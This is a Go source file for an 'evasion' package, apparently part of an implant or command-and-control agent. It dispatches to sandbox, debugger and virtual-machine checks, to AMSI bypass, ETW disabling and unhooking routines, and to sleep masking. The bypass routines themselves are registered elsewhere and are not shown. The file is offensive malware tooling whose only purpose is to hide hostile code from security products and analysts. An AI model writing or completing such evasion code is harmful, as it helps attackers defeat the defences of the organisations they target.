//go:build windows || linux

package evasion

import (
	"fmt"
	"time"
)

var (
	sandboxFns []func() bool
	debugFns   []func() bool
	vmFns      []func() bool
	amsiFn     func() error
	etwFn      func() error
	unhookFn   func() error
	maskFns    = map[string]func(uint32) error{}
)

func SandboxDetected() bool {
	for _, f := range sandboxFns {
		if f() {
			return true
		}
	}
	return false
}

func DebuggerDetected() bool {
	for _, f := range debugFns {
		if f() {
			return true
		}
	}
	return false
}

func InVM() bool {
	for _, f := range vmFns {
		if f() {
			return true
		}
	}
	return false
}

func ApplyWindowsEvasion(amsi, etw, unhook bool) error {
	if amsi && amsiFn != nil {
		if err := amsiFn(); err != nil {
			return fmt.Errorf("amsi: %w", err)
		}
	}
	if etw && etwFn != nil {
		if err := etwFn(); err != nil {
			return fmt.Errorf("etw: %w", err)
		}
	}
	if unhook && unhookFn != nil {
		if err := unhookFn(); err != nil {
			return fmt.Errorf("unhook: %w", err)
		}
	}
	return nil
}

// MaskedSleep dispatches to a compiled mask. A mask tag that is
// not linked falls back to a plain sleep rather than failing.
func MaskedSleep(mode string, ms uint32) error {
	if mode == "" || mode == "none" {
		time.Sleep(time.Duration(ms) * time.Millisecond)
		return nil
	}
	if f, ok := maskFns[mode]; ok {
		return f(ms)
	}
	time.Sleep(time.Duration(ms) * time.Millisecond)
	return nil
}
